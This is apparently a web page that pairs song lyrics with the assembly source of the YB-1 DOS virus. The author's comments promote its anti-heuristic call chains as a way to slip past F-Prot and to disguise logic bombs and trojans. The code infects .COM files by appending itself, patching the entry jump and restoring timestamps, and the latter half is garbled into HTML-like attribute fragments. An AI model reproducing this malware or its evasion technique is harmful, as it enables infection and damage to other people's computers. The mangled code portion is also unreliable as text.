

comment #  

  PRE-IGNITION
  Hey you...
  Tell me, what's your call name
  Closed, negative display
  Engaged on section three
  The acrid factories
  You...
  Putrid perfect product
  Proper platinum parts
  Proficient prototypes
  Steadily spew from these pipes
  Are you...
  The prime automaton
  Christened as YB-1
  Hey you...
  Generated by waste
  Arid quarry displaced
  Enviro-mental squeeze
  Aluminum disease
  You...
  Conscious of origin
  Intention in the wind
  Atmosphere infected
  Descendants defected
  Are you...
  Novel stroke of design
  Or relics from this mine
  Casually, choke,
  Noxious nourishment
  Embodied, illicit cure
  Ground and rock and sand
  Come crumble tumble down
  Grinding round
  The hydraulic wheel
  Extraction,
  For ultimate greed
  Now... hidden from view
  Surveying stable shifts
  A feeble groove
  Unintentional split
  Then they return to work
  As if they're not disturbed
  Cybernetic beings
  Omniscient regiment
  Thriving with vigor
  Incessant loop
  An assumed order
  Auspicious tool
  Frantically, flow
  Spumous sediment
  Remedied, neurotic fuse
  Ground and rock and sand
  Come crumble tumble down
  Yonder sound, an echoing gong
  Disjunction
  Of their disowned song
  Now... some are set free
  Emotions flood their gaze
  Synthetic breed
  The pre-ignition phase
  Pre-ignition
  Flares up in you
  Pre-ignition
  Provokes me too.

#

;**********************************************************************
; YB-1.ASM
; AUTHOR:  K”hntark
; SURGEON: Urnst Kouch
;
; Yes, another 'unremarkable' virus . . . it still will put a few more
; dollars in the accounts of the AV industry . . .
;**********************************************************************

;This virus is a simple demonstrator with a series of 'nothing' CALLS
;on virus entry which point to a end segment of recursive code which 
;are is sufficient to foil F-Prot's 'heuristic'mode. It's not elegant 
;clever or pretty or particularly smart, but it works. However,
;it's clear that such an arrangement of code can quickly make almost
;ANY direct action virus invisible to cursory F-Prot scanning
;which attempts to identify suspicious code on its similarity to viral
;patterns.  The utility depends upon circumstance.  In practice,
;we find almost no one but virus writers and anti-virus researchers
;use the 'heuristic' features of commercial programs.  And very few
;of them actually pay for the software, so it can hardly be considered
;'real world'.  By contrast, it has been our experience that few 
;administrators or PC herdsmen have the patience or time to interpret
;heuristic analyses across numerous minutely different, yet
;idiosyncratic operating systems and platforms.  The 'anti-heuristic' code
;practicality, then, lies - we feel - mostly in disguising direct
; action viruses, --------->
;logic bombs or trojan programs for quick acts of data mutilation or
;pure harrassment.  By looking at the simple implementation in YB-1/
;Handsome Dick Manitoba virus, it's clear that this kind of disguise
;is barely 5 minutes of work for even the feeblest programmer, hence
;its utility in the above categories.  In the long run, it's not
;likely to mean much difference in viral spread, although,
;it may have made a difference if included in the "Goddamn Butterflies"
;virus which was distributed in Telemate shareware packages.  Most
;warnings were issued by sysops who had scanned the Telemate programs
;with F-Prot in its 'heuristic' mode, which correctly pointed out
;the nature of the virus infection.  Including the outlined code from
;Handsome Dick Manitoba/YB-1, below, in the same "Goddamn Butterflies"
;virus, renders it invisible to scanning under the SAME conditions.
;This particular example does not get past TBScan's heuristic mode
;which works differently than F-Prot.  

;-Urnst

MAIN    SEGMENT BYTE
        ASSUME cs:main,ds:main,ss:nothing      ;all part in one segment=com file
        ORG    100h

;**********************************
;  fake host program
;**********************************
 
HOST:
        db     0E9h,0Ah,00          ;jmp    NEAR PTR VIRUS
        db     ' '
        db     090h,090h,090h
        mov    ah,4CH
        mov    al,0
        int    21H                 ;terminate normally with dos

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

;**********************************
; VIRUS CODE STARTS HERE
;**********************************


VIRUS:                            ;a label for the first byte of the virus

            call ANTI_HEUR        ;30 cents worth of anti-F-Prot type
            call ANTI_HEUR        ;heuristic analysis measures
            call ANTI_HEUR        ;the key is the 'recursive' nature of
            call ANTI_HEUR        ;the code pointed to be the ANTI-HEUR
            call ANTI_HEUR        ;calls.  When a certain threshold of
            call ANTI_HEUR        ;interior 'twisting' - bytewise - occurs
            call ANTI_HEUR        ;F-Prot gives up in heuristic mode.
            call ANTI_HEUR        ;It's not elegant, but it's cheap
            call ANTI_HEUR        ;insurance which
            call ANTI_HEUR        ;works.
            
            call GET_ENTRY_PT   ;<--when call="" is="" performed="" absolute="" address="" goes="" to="" stack="" ;in="" addition,="" it="" is="" unlikely="" these="" bytes="" will="" get_entry_pt:="" ;be="" used="" for="" signature="" recognition="" -="" unless="" pop="" si="" ;someone="" is="" criminally="" stupid.="" sub="" si,get_entry_pt="" -="" virus="" ;fix="" absolute="" address="" ;************************************="" ;="" restore="" 4="" original="" bytes="" to="" file="" ;************************************="" push="" si="" ;save="" si="" cld="" ;clear="" direction="" flag="" add="" si,start_code-virus="" mov="" di,0100h="" movsw="" ;this="" is="" shorter="" &="" faster="" than="" movsw="" ;mov="" cx,04="" and="" rep="" movsb="" pop="" si="" ;restore="" si="" call="" anti_heur="" ;another="" 30="" cents="" worth="" of="" anti-f-prot="" call="" anti_heur="" call="" anti_heur="" call="" anti_heur="" call="" anti_heur="" call="" anti_heur="" call="" anti_heur="" call="" anti_heur="" call="" anti_heur="" call="" anti_heur="" ;************************************="" ;="" redirect="" dta="" onto="" virus="" code="" ;************************************="" lea="" dx,[si+="" dta="" -="" virus]="" ;put="" dta="" at="" the="" end="" of="" the="" virus="" for="" now="" mov="" ah,1ah="" ;set="" new="" dta="" function="" int="" 21h="" ;************************************="" ;="" routines="" called="" from="" here="" ;************************************="" call="" find_file="" ;get="" a="" com="" file="" to="" attack!="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" exit_virus:="" ;************************************="" ;="" set="" old="" dta="" address="" ;************************************="" mov="" ah,1ah="" mov="" dx,80h="" ;fix="" dta="" back="" to="" return="" control="" to="" int="" 21h="" ;host="" program="" exit_virus2:="" ;****************************************************************="" ;="" zero="" out="" registers="" for="" return="" to="" ;="" host="" program="" ;****************************************************************="" mov="" si,0100h="" xor="" bx,bx="" ;zero="" regs="" xor="" ax,ax="" cwd="" push="" si="" ;save="" return="" address="" in="" stack="" xor="" si,si="" xor="" di,di="" xor="" cx,cx="" ret="" ;back="" to="" com="" host="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" anti_heur:="" ;25="" cents="" worth="" of="" anti-heuristic="" jmp="" $="" +="" 2="" ;virus="" strategy.="" nothing="" code="" call="" dolt="" call="" dolt="" call="" dolt="" call="" dolt="" ret="" ;sufficient="" to="" flummox="" analysis.="" dolt:="" jmp="" $="" +="" 2="" call="" dolt2="" ;by="" recursively="" twisting="" the="" flow="" call="" dolt2="" ;of="" virus="" instructions="" until="" the="" call="" dolt2="" ;rules="" of="" f-prot="" are="" call="" dolt2="" ;by-passed.="" actually,="" you="" can="" ret="" dolt2:="" jmp="" $="" +="" 2="" call="" dolt3="" ;probably="" use="" much="" more="" elegant="" code,="" call="" dolt3="" ;but="" the="" point="" to="" be="" made="" is="" one="" of="" call="" dolt3="" ;speed="" of="" implementation="" and="" simple="" call="" dolt3="" ;code="" additions="" which="" will="" not="" complicate="" ret="" ;the="" work="" of="" the="" virus="" or="" necessitate="" dolt3:="" jmp="" $="" +="" 2="" ;altering="" any="" of="" its="" actual="" "action"="" ret="" ;code="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" find_file:="" lea="" dx,[si="" +="" files_to_infect="" -="" virus]="" mov="" ah,4eh="" ;do="" dos="" search="" 1st="" function="" mov="" cx,3fh="" ;search="" for="" any="" file,="" with="" any="" attributes="" next_file:="" int="" 21h="" jc="" no_mo="" ;return="" if="" not="" zero="" call="" check_n_infect_file="" ;check="" file="" if="" file="" found="" mov="" ah,4fh="" ;file="" no="" good..find="" next="" function="" jmp="" next_file="" ;test="" next="" file="" for="" validity="" no_mo:="" ret="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" check_n_infect_file:="" ;*********************************************="" ;="" 1-set="" attributes="" ;*********************************************="" lea="" dx,[si="" +="" dta_file_name="" -="" virus]="" xor="" cx,cx="" ;clear="" attributes="" mov="" ax,4301h="" ;set="" file="" attributes="" to="" cx="" int="" 21h="" jc="" no_good="" ;error..="" quit="" ;*****************="" ;="" 2-open="" file="" ;*****************="" mov="" ax,3d02h="" ;r/w="" access="" to="" it="" int="" 21h="" xchg="" bx,ax="" ;bx="file" handle="" ;********************="" ;="" 3-read="" 1st="" 5="" bytes="" ;********************="" mov="" cx,5="" ;read="" first="" 5="" bytes="" of="" file="" lea="" dx,[si="" +="" start_code="" -="" virus]="" ;store'em="" here="" mov="" ah,3fh="" ;dos="" read="" function="" int="" 21h="" jc="" no_good="" ;error?="" get="" next="" file="" ;*********************="" ;="" 4-check="" file="" ;*********************="" mov="" ax,word="" ptr="" [si="" +="" dta_file_size="" -="" virus]="" ;get="" file's="" size="" add="" ax,final="" -="" virus="" +="" 232d="" +="" 1640d="" +="" 100h="" ;add="" virus="" size="" to="" it="" jc="" no_good="" ;bigger="" then="" 64k:nogood="" cmp="" word="" ptr="" [si="" +="" start_code="" -="" virus],'zm'="" ;exe="" file?="" je="" no_good="" ;no?="" good="" cmp="" byte="" ptr="" [si="" +="" start_code="" -="" virus],0e9h="" ;compare="" 1st="" byte="" to="" near="" jmp="" jne="" infect="" ;not="" a="" near="" jmp,="" file="" ok="" cmp="" byte="" ptr="" [si="" +="" start_code+3="" -="" virus],20h="" ;check="" for="" '="" '="" je="" no_good="" ;file="" ok="" ..="" infect="" jmp="" short="" infect="" no_good:="" jmp="" get_out="" infect:="" ;*********************="" ;="" 5-set="" ptr="" @eof="" ;*********************="" mov="" ax,4202h="" xor="" cx,cx="" ;prepare="" to="" write="" virus="" on="" file="" cwd="" ;position="" file="" pointer,cx:dx="0" int="" 21h="" ;*********************="" ;="" 6-write="" virus="" ;*********************="" mov="" dx,si="" ;write="" from="" here="" mov="" cx,final="" -="" virus="" mov="" ah,40h="" int="" 21h="" ;since="" ds="" does="" not="" equal="" cs="" yet="" ;*********************="" ;="" 7-set="" ptr="" @bof="" ;*********************="" mov="" ax,4200h="" ;locate="" pointer="" at="" beginning="" of="" host="" xor="" cx,cx="" cwd="" ;position="" file="" pointer,cx:dx="0" int="" 21h="" ;******************************************="" ;="" 8-write="" new="" 4="" bytes="" to="" beginning="" of="" file="" ;******************************************="" mov="" ax,word="" ptr="" [si="" +="" dta_file_size="" -="" virus]="" sub="" ax,3="" mov="" word="" ptr="" [si="" +="" start_image+1="" -="" virus],ax="" mov="" cx,4="" ;#of="" bytes="" to="" write="" lea="" dx,[si+="" start_image="" -="" virus]="" ;ds:dx="pointer" of="" data="" to="" write="" mov="" ah,40h="" ;dos="" write="" function="" int="" 21h="" ;*************************************************="" ;="" 9-restore="" date="" and="" time="" of="" file="" to="" be="" infected="" ;*************************************************="" mov="" ax,5701h="" mov="" dx,word="" ptr="" [si="" +="" dta_file_date="" -="" virus]="" mov="" cx,word="" ptr="" [si="" +="" dta_file_time="" -="" virus]="" int="" 21h="" ;****************="" ;="" 10-close="" file="" ;****************="" get_out:="" mov="" ah,3eh="" int="" 21h="" ;*************************************************="" ;="" 11-restore="" file's="" attributes="" ;*************************************************="" lea="" dx,[si="" +="" dta_file_name="" -="" virus]="" ;get="" filename="" mov="" cx,[si="" +="" dta_file_attr="" -="" virus]="" ;get="" old="" attributes="" mov="" ax,4301h="" ;set="" file="" attributes="" to="" cx="" int="" 21h="" ret="" ;infection="" done!="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" name_author="" db="" 'yb-1="" &="" handsome="" dick="" manitoba="" k”hntark'="" ;id="" files_to_infect="" db="" '*.com',0="" start_code="" db="" 090h,090h,090h,090h,090h="" ;area="" to="" store="" 5="" bytes="" to="" w/r="" from="" to="" file="" start_image="" db="" 0e9h,0,0,020h="" dta="" db="" 21="" dup(0)="" ;reserved="" dta_file_attr="" db="" dta_file_time="" dw="" dta_file_date="" dw="" dta_file_size="" dd="" dta_file_name="" db="" 13="" dup(0)="" ;ííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí="" final:="" ;label="" of="" byte="" of="" code="" to="" be="" kept="" in="" virus="" when="" it="" moves="" main="" ends="" end="" host=""></--when>